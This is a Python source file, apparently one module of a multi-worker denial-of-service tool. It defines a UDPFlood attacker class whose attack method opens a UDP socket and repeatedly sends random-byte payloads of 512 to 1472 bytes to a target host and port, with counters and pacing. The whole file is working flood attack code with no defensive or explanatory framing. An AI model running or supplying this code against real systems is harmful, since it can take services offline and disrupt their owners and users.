import socket
import random
import time

from .base import BaseAttacker

class UDPFlood(BaseAttacker):
    def __init__(self, args, config, stats, running, worker_id):
        super().__init__(args, config, stats, running, worker_id)
        self.udp_config = config.get('udp', {})

    def attack(self):
        min_size = self.udp_config.get('min_size', 512)
        max_size = self.udp_config.get('max_size', 1472)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while self.running.value:
                try:
                    payload_size = random.randint(min_size, max_size)
                    payload = random.randbytes(payload_size)
                    sock.sendto(payload, (self.target, self.port))
                    self._count(sent=1, size=payload_size)
                except Exception:
                    self._count(failed=1)
                    time.sleep(0.001)
                self._pace()
        finally:
            try:
                sock.close()
            except Exception:
                pass
            self.finalize()